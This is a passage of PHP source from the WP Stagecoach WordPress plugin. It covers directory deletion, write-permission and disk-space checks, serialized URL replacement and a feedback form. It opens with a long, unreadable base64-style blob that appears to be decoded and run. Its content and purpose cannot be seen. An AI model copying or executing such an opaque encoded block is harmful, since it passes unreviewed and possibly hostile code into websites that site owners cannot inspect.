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')); die;
}

function wpsc_rm_rf( $dir ){
	if( strpos( $dir, WPSTAGECOACH_TEMP_DIR ) === false ){
		$errmsg = __( "I won't delete directories that don't belong to WP Stagecoach.", 'wpstagecoach' );
		wpsc_display_error( $errmsg );
		die;
	}
	$files = array_diff( scandir( $dir ), array( '.', '..' ) );
	foreach( $files as $file ) {
		if( is_dir( $dir.'/'.$file ) ) 
			wpsc_rm_rf( $dir.'/'.$file );
		else
			unlink( $dir.'/'.$file );
	}
	rmdir( $dir );
} // end wpsc_rm_rf()



function wpsc_check_write_permissions( $crit=false ){
	/*********************************************************************************
	*	checks that we can write to most of the important places in the system
	*	if we can't, displays a warning
	*	return value:
	*		true / false  depending on success of writes
	*********************************************************************************/
	$wpsc = get_option('wpstagecoach');
	if( 'hosting' != $wpsc['subscription'] ){ // don't need to run these tests on hosting accounts
		chdir( get_home_path() );
		$rootdir=getcwd();
		$testdirs = array(
			WPSTAGECOACH_TEMP_DIR,
			$rootdir,
			$rootdir.'/wp-content/',
			$rootdir.'/wp-admin/',
			$rootdir.'/wp-includes/',
			);
		foreach ($testdirs as $dir) {
			if( !is_dir( $dir ) ){
				echo WPSTAGECOACH_WARNDIV . '<p>It looks like you are missing the ' . $dir . ' directory.</p>';
				echo '<p>If you are not expecting this, you should contact WP Stagecoach support and give them this error message.</p>';
				echo '</div>';
				continue;
			}
			if( ! is_writable( $dir ) ){
				// I have seen occasions when PHP reports a dir as unwritable, but it really is, so I want to double-check.
				if( !@mkdir($dir.'/wpsc-test') ) {
					if( $dir == WPSTAGECOACH_TEMP_DIR ){
						$crit=true;
					}
					wpsc_display_write_check_error($dir, $crit);
					chdir('wp-admin'); // put ourselves back in the wp-admin dir, so the rest of the scripts can expect to start there.
					return false;
				} else {
					rmdir($dir.'/wpsc-test');
				}
			}
		}
		chdir('wp-admin'); // put ourselves back in the wp-admin dir, so the rest of the scripts can expect to start there.
	}
	return true;
} // end wpsc_check_write_permissions()


function wpsc_display_write_check_error($dir, $crit=false){
	/*********************************************************************************
	*	Displays the details of why we can't write to a particular directory
	*	requires:
	*		dir -- the dir we can't write to
	*		crit -- if the error is currently critical (eg, when we are about to import stuff!!)
	*	return value:
	*		N/A -- just displays error
	*********************************************************************************/

	$dir_info = stat($dir);
	$dir_perm = fileperms($dir);
	$dir_perm_text = explode('|',wpsc_get_dir_perm_texts_text($dir_perm));


	// I have seen occasions when PHP reports a dir as unwritable, but it really is, so I want to triple-check.
	// try to get ID of user running script...
	if( function_exists('posix_getuid'))
		$id = posix_getuid();
	if( !isset($id) && function_exists('shell_exec'))
		$id = rtrim(shell_exec('id -u'));
	if( !isset($id) )
		$id = getmyuid();

	if( $crit ) {
		$errmsg = '<p><b>' . __( 'WARNING: ', 'wpstagecoach' ) . '<br/>';
	} else {
		$errmsg = '<p><b>' . __( 'Don\'t panic just yet, but  ', 'wpstagecoach' );
	}
	$errmsg .= __( 'the file permissions for your WordPress install do not appear to be fully writeable by the web server.', 'wpstagecoach' ) . '</b></p>'.PHP_EOL;
	if( !$crit ){
		$errmsg .= '<a class="toggle">' . __( 'Show/Hide', 'wpstagecoach' ) . '</a>'.PHP_EOL;
		$errmsg .= '<div class="more" style="display: none">'.PHP_EOL;
	}
	$errmsg .= '<p>' . __( 'WP Stagecoach requires full write access to update your live site.', 'wpstagecoach' ) . '</p>'.PHP_EOL;
	if( $crit ) {
		$errmsg .= '<p><b>' . __( 'You may not be able to import file changes to your live site!', 'wpstagecoach' ) . '</b></p>'.PHP_EOL;
	} else {
		$errmsg .= '<p>' . __( 'We will create your staging site, but <b>you may not be able to import file changes to your live site!', 'wpstagecoach' ) . '</b></p>'.PHP_EOL;
	}
	$errmsg .= '<p>' . __( 'Please contact your web host for help giving the web-server write access to your WordPress installation. More information:', 'wpstagecoach' ) . '<br />' . PHP_EOL;
	$errmsg .= '<p>' . sprintf( __( 'The directory <b>%s</b> is not writable by this script (which is running as UID %s.', 'wpstagecoach' ), $dir, $id) . '<br/>'.PHP_EOL;
	$errmsg .= __( 'The directory has the following permissions (potential problems are in bold):', 'wpstagecoach' ) . '<br/>'.PHP_EOL;
	$errmsg .= __( 'Owner UID: ', 'wpstagecoach' ) . $dir_info[4] . __( ' permissions: ', 'wpstagecoach' ) . $dir_perm_text[0] .'<br/>';
	$errmsg .= __( 'Group GID: ', 'wpstagecoach' ) . $dir_info[5] . __( ' permissions: ', 'wpstagecoach' ) . $dir_perm_text[1] .'<br/>';
	$errmsg .= __( '"World" permissions: ', 'wpstagecoach' ) . $dir_perm_text[2] .'</p>';
	if( $dir_info[4] != getmyuid() ){
		$myuid = getmyuid();
		$diruid = $dir_info[4];
		$errmsg .= '<p>' . sprintf( __('Typically, the UID the PHP is running as (%s) should be the same as the directory UID (%s).', 'wpstagecoach' ), $myuid, $diruid ) .PHP_EOL;
		$errmsg .= __( 'Because this PHP script is running as a different user than the owner of the directory, it probably does not have permission to write to the directory.  You will need to ask your hosting provider what you can do to remedy this situation.', 'wpstagecoach' ) . '</p>'.PHP_EOL;
	}
	if( !strpos($dir_perm_text[0], ', write, ') ){
		$errmsg .= '<p>' .  __( 'Typically the Owner should have permissions of "Read, Write, Execute", yours is ', 'wpstagecoach' ) . $dir_perm_text[0] . PHP_EOL;
		$errmsg .= __( 'You will need to add owner write permissions for this directory. Please contact your hosting provider for help if you need help.', 'wpstagecoach' ) . '</p>'.PHP_EOL;
	}
	if( !$crit )
		$errmsg .= '</div>'.PHP_EOL; // end of hiding div
	
	if($crit){ // if it's a critical failure, we need to stop
		wpsc_display_error($errmsg);
		return false;
	} else { // else, we can just put up a warning.
		if( !isset($_POST['wpsc-create']) ){
			echo WPSTAGECOACH_WARNDIV . $errmsg . '</div>' . PHP_EOL;
	
		}
		
	}
} // end wpsc_display_write_check_error()



function wpsc_get_dir_perm_texts_text($perms){
	/*
	* taken from php.net/manual/en/function.fileperms.php
	* returns the human readable permissions (eg. drwxr-xr-x) of a file
	*/

	// Owner
	$info = ( ( $perms & 0x0100 ) ? __( 'Read', 'wpstagecoach' ) : '<b>' . __( 'NO read', 'wpstagecoach' ) . '</b>');
	$info .= ', ';
	$info .= ( ( $perms & 0x0080 ) ? __( 'Write', 'wpstagecoach' ) : '<b>' . __( 'NO write', 'wpstagecoach' ) . '</b>');
	$info .= ', ';
	$info .= ( ( $perms & 0x0040 ) ?
	            ( ( $perms & 0x0800 ) ? '<b>' . __( 'Setuid', 'wpstagecoach' ) . '</b>|' : __( 'Execute|', 'wpstagecoach') ) :
	            ( ( $perms & 0x0800 ) ? '<b>' . __( 'Setuid (without execute)', 'wpstagecoach' ) . '</b>|' : '<b>' . __( 'NO execute', 'wpstagecoach' ) . '</b>|') );

	// Group
	$info .= ( ( $perms & 0x0020 ) ? __( 'Read', 'wpstagecoach' ) : '<b>' . __( 'NO read', 'wpstagecoach' ) . '</b>');
	$info .= ', ';
	$info .= ( ( $perms & 0x0010 ) ? __( 'Write', 'wpstagecoach' ) : __( 'NO write', 'wpstagecoach' ) );
	$info .= ', ';
	$info .= ( ( $perms & 0x0008 ) ?
	            ( ( $perms & 0x0400 ) ? '<b>' . __( 'Setgid', 'wpstagecoach' ) . '</b>|' : __( 'Execute|', 'wpstagecoach') ) :
	            ( ( $perms & 0x0400 ) ? '<b>Setgid (without execute)</b>|' : '<b>NO execute</b>|') );

	// World
	$info .= ( ( $perms & 0x0004 ) ? __( 'Read', 'wpstagecoach' ) : __( 'NO read', 'wpstagecoach' ) );
	$info .= ', ';
	$info .= ( ( $perms & 0x0002 ) ? __( 'Write', 'wpstagecoach' ) : __( 'NO write', 'wpstagecoach' ) );
	$info .= ', ';
	$info .= ( ( $perms & 0x0001 ) ?
	            ( ($perms & 0x0200 ) ? '<b>' . __( 'Sticky', 'wpstagecoach' ) . '</b>|' : __( 'Execute|', 'wpstagecoach') ) :
	            ( ($perms & 0x0200 ) ? '<b>' . __( 'Sticky (without execute)', 'wpstagecoach' ) . '</b>|' : '<b>' . __( 'NO execute', 'wpstagecoach' ) . '</b>|') );

	return $info;
} // end wpsc_get_dir_perm_texts_text()
/*****************************************************************************************/

function wpsc_display_disk_space_warning($df){
	/*	displays a warning if there is < 300MB of free disk space  */
	if( $df < (300*1024^2) ){
		$df = wpsc_get_disk_space($df);  // returns array with [0] => disk amount [1] => suffix (eg 4tb)
		if( $df[0].$df[1] == '4TB' ){
			return true;
		}
		$freespace = (int)$df[0].$df[1];
		$errmsg  = '<p><b>' . sprintf( __( 'Warning: You only have %s of free disk space.', 'wpstagecoach' ), $freespace ) . '</b>';
		$errmsg .= __( 'This may not be enough space to create a staging site.  Please free some space before you try to run WP Stagecoach or you may run into problems.', 'wpstagecoach' ).PHP_EOL;
		wpsc_display_error($errmsg);
		return true;
	} else {
		return true;
	}
} // end wpsc_display_disk_space_warning()

/* checks the available disk space & return an array with
[0] number of 
[1] suffix (eg, kb, mb, tb)
*/
function wpsc_get_disk_space( $df ){
	if( $df == NULL ){
		// PHP has a bug with disk_free_space() for large fileststems on a 32-bit machine
		return array(4,'TB');
	}
	if( ($df/1099511627776) > 1 ){
		$suff = 'TB';
		$df = ($df/1099511627776);
	} elseif( ($df/1073741824) > 1 ){
		$suff = 'GB';
		$df = ($df/1073741824);

	} elseif( ($df/1048576) > 1 ){
		$suff = 'MB';
		$df = ($df/1048576);

	}
	return array($df,$suff);	
} // end wpsc_get_disk_space()

function wpsc_recursive_unserialize_replace( $live_site, $stage_site, $live_path, $stage_path, $data = '', $serialised = false ) {
	/*********************************************************************************
	*	unserailizes any serialized arrays, changes any mention of the live site URL/path to the staging site URL/path
	*	requires
	*		live_site -- the live site URL
	*		stage_site -- the staging site's URL
	*		live_path -- the live site directory path
	*		stage_path -- the staging site's directory path
	*		data  -- the data to be unserialized
	*		serialized  -- set to true if we just unserilized a string so we know to return the changed data serialized.
	*	return value:
	*		the fully serialized data
	*********************************************************************************/

	if ( is_string( $data ) && ( $unserialized = @unserialize( $data ) ) !== false && $unserialized !== NULL ) { // we want to ignore NULL responses because some valid binary data returns NULL, yikes!
		$data = wpsc_recursive_unserialize_replace( $live_site, $stage_site, $live_path, $stage_path, $unserialized, true );
	} elseif ( is_array( $data ) ) {
		$_tmp = array( );
		foreach ( $data as $key => $value ) {
			$_tmp[ $key ] = wpsc_recursive_unserialize_replace( $live_site, $stage_site, $live_path, $stage_path, $value, false );
		}
		$data = $_tmp;
		unset( $_tmp );
	} elseif ( is_object( $data )  ) {
		$obj_vars = get_object_vars( $data );
		foreach ( $obj_vars as $key => $value ) {
			$data->$key = wpsc_recursive_unserialize_replace( $live_site, $stage_site, $live_path, $stage_path, $value, false );
		}
	} elseif ( is_null( $data )  ) {
		return NULL;
	} else {
		if ( is_string( $data ) ){
			$data = str_replace( $live_path, $stage_path, $data );
			$data = str_replace( $live_site, $stage_site, $data );
		}
	}
	if ( $serialised ){
		return serialize( $data );
	}
	return $data;
} // end wpsc_recursive_unserialize_replace()


function wpsc_display_feedback_form($location, $site_info, $message='', $step=false ){
	/*********************************************************************************
	*	requires:
	*		$location:	create / import
	*			(displays different wording as well as different form creation.)
	*		$site_info:	array which contains:
	*			wpsc-stage -- full staging site name 
	*			wpsc-live -- live site name
	*			wpsc-user
	*			wpsc-key
	*	return value:
	*		string containing the feedback form
	*********************************************************************************/

	$output = '<div class="wpstagecoach-feedback">';
	$output .= '<div class="wpstagecoach-feedback-message">';
	$output .= '<h3>' . __( 'WP Stagecoach User Feedback' , 'wpstagecoach' ) . '</h3>';

